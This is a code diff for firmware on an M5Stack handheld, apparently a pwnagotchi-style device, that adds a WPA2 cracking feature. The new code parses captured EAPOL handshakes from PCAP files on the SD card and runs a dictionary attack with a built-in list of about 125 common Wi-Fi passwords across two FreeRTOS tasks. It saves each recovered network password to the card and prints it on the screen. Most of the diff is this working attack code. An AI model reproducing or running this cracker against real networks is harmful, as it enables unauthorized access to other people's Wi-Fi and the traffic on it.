@@ -11,6 +11,10 @@
 #include "command/ThemeCommand.h"
 #include "command/BrightnessCommand.h"
 #include "command/PowerOffCommand.h"
+#include "command/CrackCommand.h"
+#include "../core/FastWpaCrack.h"
+#include <freertos/queue.h>
+#include <freertos/semphr.h>
 
 #if defined(ARDUINO_M5STACK_CORES3)
     static constexpr int SD_CS = 4;
@@ -21,11 +25,12 @@
 #endif
 
 static ProfileCommand    s_profile;
+static CrackCommand      s_crack;
 static ThemeCommand      s_theme;
 static BrightnessCommand s_brightness;
 static PowerOffCommand   s_poweroff;
 static MenuCommand*      s_rootItems[] = {
-    &s_profile, &s_theme, &s_brightness, &s_poweroff
+    &s_profile, &s_crack, &s_theme, &s_brightness, &s_poweroff
 };
 static constexpr int ROOT_N = (int)(sizeof(s_rootItems) / sizeof(s_rootItems[0]));
 
@@ -84,6 +89,7 @@ void App::openSubMenu(MenuCommand* cmd) { _activeSubCmd = cmd; _menuState = Menu
 void App::setPendingTheme(int8_t idx)     { _pendingTheme  = idx; }
 void App::setPendingBrightness(uint8_t v) { _pendingBright = (int)v; }
 void App::setPendingPowerOff()            { _pendingPowerOff = true; }
+void     App::startCrack()            { _startCrack(); }
 uint32_t App::statsXp()         const { return _stats.xp(); }
 uint32_t App::statsCaptures()   const { return _stats.captures(); }
 uint32_t App::statsLevel()      const { return _stats.level(); }
@@ -256,6 +262,7 @@ void App::_updateTyping(uint32_t ms) {
 // ── Hunting integration ───────────────────────────────────────
 
 void App::_updateHunting(uint32_t ms) {
+    if (_crackState != CrackState::Idle) return;
     if (ms - _statusLogMs >= 10000) {
         _statusLogMs = ms;
         Serial.printf("[STATUS] phase=%d ch=%d bat=%d%% caps=%lu xp=%lu\n",
@@ -349,6 +356,348 @@ void App::_updateHunting(uint32_t ms) {
         uint16_t r2 = r1 + (uint16_t)(fsize & 0xFFFF);
         _qPushCmd("dump 0x%04x..0x%04x >> %.27s", r1, r2, fname);
     }
+}
+
+// ── Crack ─────────────────────────────────────────────────────
+
+static const char* const kCrackPasswords[] = {
+  "12345678",  "123456789", "1234567890", "11111111",  "00000000",
+  "87654321",  "11223344",  "12344321",   "99999999",  "88888888",
+  "55555555",  "12121212",  "13131313",   "10101010",  "98765432",
+  "12341234",  "11112222",  "22222222",   "33333333",  "44444444",
+  "66666666",  "77777777",  "01234567",   "20202020",  "19191919",
+  "password",  "password1", "passw0rd",   "pass1234",  "password12",
+  "password123","admin123", "admin1234",  "admin2020", "root1234",
+  "master12",  "login123",  "access14",   "letmein1",  "trustno1",
+  "welcome1",  "changeme",  "default1",   "guest1234", "user1234",
+  "test1234",  "temp1234",  "pass12345",  "p@ssw0rd",  "p@ss1234",
+  "qwerty123", "qwertyui",  "qwerty12",   "qwer1234",  "qwerasdf",
+  "asdfghjk",  "asdf1234",  "zxcvbnm1",   "1234asdf",  "1234qwer",
+  "1q2w3e4r",  "zaq12wsx",  "1qaz2wsx",   "qazwsx123", "!q2w3e4r",
+  "wifi1234",  "wifi12345", "wlan1234",   "router12",  "netgear1",
+  "linksys1",  "dlink1234", "tplink12",   "huawei12",  "modem123",
+  "internet",  "wireless",  "network1",   "connect1",  "homewifi",
+  "mywifi123", "wifiwifi",  "setup1234",  "broadband", "fiber123",
+  "abc12345",  "abcd1234",  "1234abcd",   "aa123456",  "a1234567",
+  "a1b2c3d4",  "aaa11111",  "xyz12345",   "system12",  "server12",
+  "cisco123",  "ubnt1234",  "mikrotik",   "radius12",  "monitor1",
+  "14141414",  "12345679",  "11111112",   "01020304",  "02468024",
+  "13572468",  "10203040",  "11235813",   "31415926",  "27182818",
+};
+static constexpr int kCrackPasswordCount =
+    (int)(sizeof(kCrackPasswords) / sizeof(kCrackPasswords[0]));
+
+// ── PCAP helpers ──────────────────────────────────────────────
+
+static const uint8_t kEapolSnapSig[8] = {0xAA,0xAA,0x03,0x00,0x00,0x00,0x88,0x8E};
+static constexpr uint16_t kKiAck     = 0x0080;
+static constexpr uint16_t kKiMic     = 0x0100;
+static constexpr uint16_t kKiInstall = 0x0040;
+
+static bool crackPcapRead32(File& f, uint32_t& v) {
+    uint8_t b[4];
+    if (f.read(b, 4) != 4) return false;
+    v = (uint32_t)b[0]|((uint32_t)b[1]<<8)|((uint32_t)b[2]<<16)|((uint32_t)b[3]<<24);
+    return true;
+}
+
+static int crackFindSnap(const uint8_t* frm, uint16_t len) {
+    for (uint16_t i = 0; i + 8 <= len; i++) {
+        bool ok = true;
+        for (int k = 0; k < 8; k++) if (frm[i+k] != kEapolSnapSig[k]) { ok=false; break; }
+        if (ok) return (int)i;
+    }
+    return -1;
+}
+
+static const uint8_t* crackParseEapolKey(const uint8_t* frm, uint16_t flen,
+                                          const uint8_t** eapolOut, uint16_t* totalOut) {
+    if (flen < 24) return nullptr;
+    const uint16_t fc = (uint16_t)frm[0] | ((uint16_t)frm[1] << 8);
+    if (((fc & 0x000C) >> 2) != 2) return nullptr;
+    int snap = crackFindSnap(frm, flen);
+    if (snap < 0 || (uint16_t)(snap + 9) >= flen) return nullptr;
+    const uint8_t* eapol = frm + snap + 8;
+    if (eapol[1] != 0x03) return nullptr;
+    uint16_t eap_len = ((uint16_t)eapol[2] << 8) | eapol[3];
+    uint16_t total   = 4 + eap_len;
+    uint16_t avail   = flen - (uint16_t)(snap + 8);
+    if (total < 97 || avail < 97) return nullptr;
+    if (total > avail) total = avail;
+    *eapolOut = eapol;
+    *totalOut = total;
+    return eapol + 4;
+}
+
+static bool crackParsePcap(const char* path, App::CrackHandshake& hs) {
+    memset(&hs, 0, sizeof(hs));
+    File f = SD.open(path, FILE_READ);
+    if (!f) return false;
+
+    uint8_t gh[24];
+    if (f.read(gh, 24) != 24 ||
+        !(gh[0]==0xD4&&gh[1]==0xC3&&gh[2]==0xB2&&gh[3]==0xA1)) { f.close(); return false; }
+
+    uint32_t linktype = (uint32_t)gh[20]|((uint32_t)gh[21]<<8)|
+                        ((uint32_t)gh[22]<<16)|((uint32_t)gh[23]<<24);
+
+    bool gotAnonce = false, gotM2 = false;
+    uint8_t lastAnonce[32]={}, lastAp[6]={}, lastSta[6]={};
+    bool pendM2=false;
+    uint8_t pendSta[6]={}, pendAp[6]={}, pendSnonce[32]={}, pendMic[16]={};
+    uint8_t pendEapol[300]={};
+    uint16_t pendEapolLen=0;
+    uint8_t rec[512];
+
+    while (f.available() > 16) {
+        uint32_t ts,tu,incl,orig;
+        if (!crackPcapRead32(f,ts)||!crackPcapRead32(f,tu)||
+            !crackPcapRead32(f,incl)||!crackPcapRead32(f,orig)) break;
+        if (!incl || incl > sizeof(rec)) { f.seek(f.position()+incl); continue; }
+        if (f.read(rec, incl) != (int)incl) break;
+        uint16_t off = 0;
+        if (linktype == 127) {
+            if (incl < 4) continue;
+            off = (uint16_t)rec[2]|((uint16_t)rec[3]<<8);
+            if (off >= incl) continue;
+        }
+        const uint8_t* frm  = rec + off;
+        uint16_t       flen = (uint16_t)(incl - off);
+
+        // Beacon — grab SSID
+        const uint16_t fc    = (uint16_t)frm[0]|((uint16_t)frm[1]<<8);
+        const uint8_t  fcTyp = (fc & 0x000C) >> 2;
+        const uint8_t  fcSub = (fc & 0x00F0) >> 4;
+        if (fcTyp==0 && fcSub==8 && flen>=36 && hs.ssid[0]=='\0') {
+            uint16_t pos = 36;
+            while (pos + 2 <= flen) {
+                uint8_t id=frm[pos], elen=frm[pos+1];
+                if (pos+2+elen > flen) break;
+                if (id==0 && elen>0 && elen<=32) {
+                    memcpy(hs.ssid, frm+pos+2, elen); hs.ssid[elen]='\0';
+                    hs.ssid_len=(uint8_t)elen; break;
+                }
+                pos += 2 + elen;
+            }
+            continue;
+        }
+
+        const uint8_t* eapol; uint16_t total;
+        const uint8_t* key = crackParseEapolKey(frm, flen, &eapol, &total);
+        if (!key) continue;
+        uint16_t ki = ((uint16_t)key[1]<<8)|key[2];
+        bool ack=ki&kKiAck, mic=ki&kKiMic, inst=ki&kKiInstall;
+
+        if (ack && (!mic||inst)) {
+            memcpy(lastAp, frm+10, 6); memcpy(lastSta, frm+4, 6);
+            memcpy(lastAnonce, key+13, 32); gotAnonce=true;
+            if (pendM2 && memcmp(pendSta,lastSta,6)==0 && memcmp(pendAp,lastAp,6)==0) {
+                memcpy(hs.ap,lastAp,6); memcpy(hs.sta,lastSta,6);
+                memcpy(hs.anonce,lastAnonce,32); memcpy(hs.snonce,pendSnonce,32);
+                memcpy(hs.mic,pendMic,16);
+                if (pendEapolLen<=sizeof(hs.eapol)) {
+                    memcpy(hs.eapol,pendEapol,pendEapolLen);
+                    memset(hs.eapol+81,0,16); hs.eapol_len=pendEapolLen;
+                }
+                gotM2=true;
+            }
+        } else if (!ack && mic && !inst) {
+            bool nonceZero=true;
+            for (int z=0;z<32&&nonceZero;z++) nonceZero=(key[13+z]==0);
+            if (nonceZero) continue;
+            if (gotAnonce && memcmp(frm+10,lastSta,6)==0 && memcmp(frm+4,lastAp,6)==0) {
+                memcpy(hs.ap,lastAp,6); memcpy(hs.sta,lastSta,6);
+                memcpy(hs.anonce,lastAnonce,32); memcpy(hs.snonce,key+13,32);
+                memcpy(hs.mic,eapol+81,16);
+                if (total<=sizeof(hs.eapol)) {
+                    memcpy(hs.eapol,eapol,total);
+                    memset(hs.eapol+81,0,16); hs.eapol_len=total;
+                }
+                gotM2=true;
+            } else {
+                pendM2=true;
+                memcpy(pendSta,frm+10,6); memcpy(pendAp,frm+4,6);
+                memcpy(pendSnonce,key+13,32); memcpy(pendMic,eapol+81,16);
+                if (total<=sizeof(pendEapol)) {
+                    memcpy(pendEapol,eapol,total);
+                    memset(pendEapol+81,0,16); pendEapolLen=total;
+                }
+            }
+        }
+    }
+    f.close();
+    if (!gotM2) return false;
+
+    // SSID fallback from filename
+    if (hs.ssid[0]=='\0') {
+        const char* sl=strrchr(path,'/');
+        const char* us=strchr(sl?sl+1:path,'_');
+        const char* dt=strrchr(path,'.');
+        if (us && dt && dt>us+1) {
+            int n=(int)(dt-us-1); if (n>32) n=32;
+            memcpy(hs.ssid, us+1, n); hs.ssid[n]='\0';
+            hs.ssid_len=(uint8_t)n;
+        }
+        if (hs.ssid[0]=='\0') return false;
+    }
+
+    // Build PRF data
+    uint8_t* p=hs.prf_data;
+    if (memcmp(hs.ap,hs.sta,6)<0) { memcpy(p,hs.ap,6);p+=6;memcpy(p,hs.sta,6);p+=6; }
+    else                           { memcpy(p,hs.sta,6);p+=6;memcpy(p,hs.ap,6);p+=6;  }
+    if (memcmp(hs.anonce,hs.snonce,32)<0) {
+        memcpy(p,hs.anonce,32);p+=32;memcpy(p,hs.snonce,32);
+    } else {
+        memcpy(p,hs.snonce,32);p+=32;memcpy(p,hs.anonce,32);
+    }
+    return true;
+}
+
+void App::_crackWorkerTask(void* param) {
+    CrackCtx* ctx = static_cast<CrackCtx*>(param);
+    CrackPwEntry entry;
+    while (true) {
+        if (xQueueReceive(ctx->queue, &entry, portMAX_DELAY) != pdTRUE) break;
+        if (entry.len == 0) break;
+        if (ctx->found || ctx->stop) {
+            __atomic_fetch_add(&ctx->tested, 1, __ATOMIC_RELAXED); continue;
+        }
+        if (fast_wpa2_try_password(entry.pw, entry.len,
+                                    ctx->hs.ssid, ctx->hs.ssid_len,
+                                    ctx->hs.prf_data, ctx->hs.eapol,
+                                    ctx->hs.eapol_len, ctx->hs.mic)) {
+            ctx->found = true;
+            memcpy(ctx->foundPass, entry.pw, entry.len + 1);
+        }
+        __atomic_fetch_add(&ctx->tested, 1, __ATOMIC_RELAXED);
+    }
+    xSemaphoreGive(ctx->doneSem);
+    vTaskDelete(NULL);
+}
+
+void App::_crackProdTask(void* param) {
+    CrackCtx* ctx = static_cast<CrackCtx*>(param);
+
+    auto tryHere = [&](const char* pw, size_t len) {
+        memcpy(ctx->curPass, pw, len + 1);
+        if (fast_wpa2_try_password(pw, (uint8_t)len,
+                                    ctx->hs.ssid, ctx->hs.ssid_len,
+                                    ctx->hs.prf_data, ctx->hs.eapol,
+                                    ctx->hs.eapol_len, ctx->hs.mic)) {
+            memcpy(ctx->foundPass, pw, len + 1);
+            ctx->found = true;
+        }
+        __atomic_fetch_add(&ctx->tested, 1, __ATOMIC_RELAXED);
+    };
+
+    auto sendToWorker = [&](const char* pw, size_t len) -> bool {
+        CrackPwEntry entry;
+        memcpy(entry.pw, pw, len + 1);
+        entry.len = (uint8_t)len;
+        return xQueueSend(ctx->queue, &entry, 0) == pdTRUE;
+    };
+
+    int i = 0;
+    while (i < kCrackPasswordCount && !ctx->stop && !ctx->found) {
+        size_t n = strlen(kCrackPasswords[i]);
+        if (!sendToWorker(kCrackPasswords[i], n)) {
+            tryHere(kCrackPasswords[i], n); i++;
+        } else {
+            i++;
+            if (i < kCrackPasswordCount && !ctx->stop && !ctx->found) {
+                tryHere(kCrackPasswords[i], strlen(kCrackPasswords[i])); i++;
+            }
+        }
+        ctx->bytesDone = (uint32_t)i;
+    }
+
+    CrackPwEntry poison; memset(&poison, 0, sizeof(poison));
+    xQueueSend(ctx->queue, &poison, pdMS_TO_TICKS(2000));
+    xSemaphoreTake(ctx->doneSem, pdMS_TO_TICKS(5000));
+    ctx->done = true;
+    vTaskDelete(nullptr);
+}
+
+void App::_startCrack() {
+    _qPushCmd("crack");
+
+    // Find a parseable PCAP in /netgotchi/eapol/
+    CrackHandshake hs;
+    char pcapPath[80] = {};
+    File dir = SD.open("/netgotchi/eapol");
+    if (dir) {
+        File f = dir.openNextFile();
+        while (f) {
+            const char* name = f.name();
+            // name() on ESP32 Arduino returns basename only
+            snprintf(pcapPath, sizeof(pcapPath), "/netgotchi/eapol/%s", name);
+            f.close();
+            int nl = (int)strlen(pcapPath);
+            if (nl >= 5 && strcmp(pcapPath + nl - 5, ".pcap") == 0) {
+                if (crackParsePcap(pcapPath, hs)) break;
+            }
+            pcapPath[0] = '\0';
+            f = dir.openNextFile();
+        }
+        dir.close();
+    }
+
+    if (pcapPath[0] == '\0') {
+        _qPushOut("no eapol captures found");
+        return;
+    }
+
+    _qPushOut("service stop");
+    _qPushOut("target: %.32s", hs.ssid);
+
+    _hunter.pause();
+
+    memset(&_crackCtx, 0, sizeof(_crackCtx));
+    _crackCtx.hs        = hs;
+    _crackCtx.fileSize  = (uint32_t)kCrackPasswordCount;
+    _crackCtx.queue     = xQueueCreate(CRACK_QUEUE_DEPTH, sizeof(CrackPwEntry));
+    _crackCtx.doneSem   = xSemaphoreCreateBinary();
+
+    xTaskCreatePinnedToCore(_crackWorkerTask, "wpa2_w", 8192, &_crackCtx, 1,
+                            &_crackCtx.workerHandle, 0);
+    xTaskCreatePinnedToCore(_crackProdTask,   "wpa2_p", 8192, &_crackCtx, 1,
+                            &_crackProdHandle, 1);
+
+    _crackState = CrackState::Running;
+}
+
+void App::_updateCracking(uint32_t ms) {
+    (void)ms;
+    if (!_crackCtx.done) return;
+
+    // Tasks finished — clean up
+    _crackProdHandle = nullptr;
+    _crackCtx.workerHandle = nullptr;
+    if (_crackCtx.queue)   { vQueueDelete(_crackCtx.queue);       _crackCtx.queue   = nullptr; }
+    if (_crackCtx.doneSem) { vSemaphoreDelete(_crackCtx.doneSem); _crackCtx.doneSem = nullptr; }
+
+    if (_crackCtx.found) {
+        // Save cracked password
+        char savePath[80];
+        char bssid[13];
+        snprintf(bssid, sizeof(bssid), "%02X%02X%02X%02X%02X%02X",
+                 _crackCtx.hs.ap[0], _crackCtx.hs.ap[1], _crackCtx.hs.ap[2],
+                 _crackCtx.hs.ap[3], _crackCtx.hs.ap[4], _crackCtx.hs.ap[5]);
+        SD.mkdir("/netgotchi/cracked");
+        snprintf(savePath, sizeof(savePath), "/netgotchi/cracked/%.12s_%.32s.pass",
+                 bssid, _crackCtx.hs.ssid);
+        File pf = SD.open(savePath, FILE_WRITE);
+        if (pf) { pf.print(_crackCtx.foundPass); pf.close(); }
+
+        _qPushOut("ssid: %.32s", _crackCtx.hs.ssid);
+        _qPushOut("pass: %.32s", _crackCtx.foundPass);
+    }
+
+    _qPushOut("finish");
+    _qPushCmd("service netgotchi start");
+
+    _hunter.resume();
+    _crackState = CrackState::Idle;
 }
 
 // ── Touch handling ────────────────────────────────────────────
@@ -520,8 +869,25 @@ void App::_drawLog(M5Canvas& c) const {
 
 void App::_drawInput(M5Canvas& c) const {
     c.drawFastHLine(0, INPUT_DIVIDER_Y, SCR_W, Theme::DIM);
-    c.fillRect(0, INPUT_DIVIDER_Y + 1, SCR_W,
-               SCR_H - (INPUT_DIVIDER_Y + 1), Theme::BG);
+    c.fillRect(0, INPUT_DIVIDER_Y + 1, SCR_W, SCR_H - (INPUT_DIVIDER_Y + 1), Theme::BG);
+
+    if (_crackState == CrackState::Running) {
+        uint32_t pct = (_crackCtx.fileSize > 0)
+            ? (uint32_t)((uint64_t)_crackCtx.bytesDone * 100 / _crackCtx.fileSize)
+            : 0;
+        if (pct > 100) pct = 100;
+        char bar[21]; int filled = (int)(20 * pct / 100);
+        for (int i = 0; i < 20; i++) bar[i] = (i < filled) ? '#' : ' ';
+        bar[20] = '\0';
+        char buf[40];
+        snprintf(buf, sizeof(buf), "[%s] %lu%%", bar, (unsigned long)pct);
+        c.setFont(&fonts::Font0);
+        c.setTextSize(1);
+        c.setTextColor(Theme::FG, Theme::BG);
+        c.setTextDatum(lgfx::top_left);
+        c.drawString(buf, MARGIN, INPUT_Y);
+        return;
+    }
 
     c.setFont(&fonts::Font0);
     c.setTextSize(1);
@@ -626,6 +992,7 @@ void App::update() {
     }
 
     _handleTouch(ms);
+    if (_crackState == CrackState::Running) _updateCracking(ms);
     _updateHunting(ms);
     _updateTyping(ms);
 
